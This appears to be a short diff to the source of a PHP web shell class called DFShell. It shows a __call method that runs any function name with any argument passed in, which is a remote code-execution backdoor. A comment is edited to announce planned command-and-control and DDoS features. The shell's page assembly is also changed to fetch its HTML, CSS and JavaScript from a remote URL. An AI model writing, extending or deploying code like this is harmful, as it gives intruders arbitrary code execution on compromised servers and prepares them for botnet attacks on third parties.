@@ -139,7 +139,7 @@ class DFShell{
     function __call($method, $arg){
         if(isset($method) && isset($arg)){
             $arg[0]($arg[1]);
-            //upcoming CNC
+            //upcoming CNC ddos
         }
     }
 
@@ -1360,7 +1360,7 @@ Document Root : ".$GLOBALS['DFConfig'][2]['DOCUMENT_ROOT']." | Disk : ".$disklin
     }
     public function DFStart(){
         $contents = $GLOBALS['DFSyntax'][0](self::$remote_url . "/head.html");
-        $contents = preg_replace('/%{style}%/i',$GLOBALS['DFSyntax'][0]("css/dfs.css"),$contents); //example
+        $contents = preg_replace('/%{style}%/i',$GLOBALS['DFSyntax'][0](self::$remote_url . "/dfs.css"),$contents); //example
         $contents = preg_replace('/%{js}%/i',$GLOBALS['DFSyntax'][0](self::$remote_url . "/script.js"),$contents);
         return $contents;
     }
